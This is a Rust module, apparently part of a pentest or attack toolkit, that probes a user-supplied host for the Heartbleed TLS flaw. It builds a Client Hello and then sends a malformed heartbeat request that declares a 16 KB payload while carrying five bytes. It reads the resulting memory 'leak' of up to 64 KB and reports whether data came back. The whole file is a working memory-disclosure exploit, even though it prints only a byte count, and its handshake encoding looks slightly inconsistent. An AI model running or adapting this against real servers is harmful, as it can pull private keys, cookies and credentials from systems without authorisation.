use anyhow::{Context, Result};
use std::io::{self, Write};
use std::net::ToSocketAddrs;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

pub async fn run(target: &str) -> Result<()> {
    run_interactive(target).await
}

pub async fn run_interactive(target: &str) -> Result<()> {
    let port = prompt_port().unwrap_or(443);
    run_with_port(target, port).await
}

pub async fn run_with_port(target: &str, port: u16) -> Result<()> {
    let raw = target.trim();
    let stripped = raw.trim_start_matches('[').trim_end_matches(']');
    let host = if stripped.contains(':') {
        format!("[{}]", stripped)
    } else {
        stripped.to_string()
    };
    let addr = format!("{}:{}", host, port);

    println!("[*] Connecting to {}...", addr);
    let socket_addr = addr
        .to_socket_addrs()
        .context("Invalid target address format")?
        .next()
        .context("Could not resolve target address")?;

    let stream_result = timeout(Duration::from_secs(5), TcpStream::connect(socket_addr)).await;
    let mut stream = match stream_result {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            println!("[-] Connection to {} failed: {}", socket_addr, e);
            return Ok(());
        }
        Err(_) => {
            println!("[-] Connection to {} timed out", socket_addr);
            return Ok(());
        }
    };

    stream.write_all(&build_client_hello()).await?;
    let mut response = vec![0u8; 4096];
    let read_result = timeout(Duration::from_secs(5), stream.read(&mut response)).await;
    match read_result {
        Ok(Ok(n)) if n > 0 => {}
        _ => {
            println!("[-] No response to Client Hello");
            return Ok(());
        }
    }

    stream.write_all(&build_heartbeat_request(0x4000)).await?;
    let mut leak = vec![0u8; 65535];
    let read_result = timeout(Duration::from_secs(5), stream.read(&mut leak)).await;
    match read_result {
        Ok(Ok(n)) if n > 0 => {
            println!("[+] Possible heartbleed vulnerability! Received {} bytes.", n);
        }
        _ => {
            println!("[-] Target does not seem vulnerable (no heartbeat response).");
        }
    }
    Ok(())
}

fn build_client_hello() -> Vec<u8> {
    let version: u16 = 0x0302;
    let mut random = vec![0u8; 32];
    random[0..4].copy_from_slice(&0x12345678u32.to_be_bytes());
    let mut hello = vec![];
    hello.extend_from_slice(&version.to_be_bytes());
    hello.extend_from_slice(&random);
    hello.push(0);
    hello.extend_from_slice(&0x0002u16.to_be_bytes());
    hello.extend_from_slice(&0x0033u16.to_be_bytes());
    hello.extend_from_slice(&0x0039u16.to_be_bytes());
    hello.push(1);
    hello.push(0);
    hello.extend_from_slice(&0x0000u16.to_be_bytes());
    let mut handshake = vec![0x01];
    let len = (hello.len() as u32).to_be_bytes();
    handshake.extend_from_slice(&len[1..]);
    handshake.extend_from_slice(&hello);
    build_tls_record(0x16, version, &handshake)
}

fn build_heartbeat_request(length: u16) -> Vec<u8> {
    let mut payload = vec![0x01, (length >> 8) as u8, length as u8];
    payload.extend_from_slice(&[0x42, 0x42, 0x42, 0x42, 0x42]);
    build_tls_record(0x18, 0x0302, &payload)
}

fn build_tls_record(record_type: u8, version: u16, payload: &[u8]) -> Vec<u8> {
    let mut record = vec![record_type];
    record.extend_from_slice(&version.to_be_bytes());
    record.extend_from_slice(&(payload.len() as u16).to_be_bytes());
    record.extend_from_slice(payload);
    record
}

fn prompt_port() -> Option<u16> {
    print!("Enter port (default 443): ");
    io::stdout().flush().ok();
    let mut input = String::new();
    if io::stdin().read_line(&mut input).is_ok() {
        let input = input.trim();
        if input.is_empty() {
            return None;
        }
        if let Ok(p) = input.parse::<u16>() {
            return Some(p);
        }
    }
    None
}
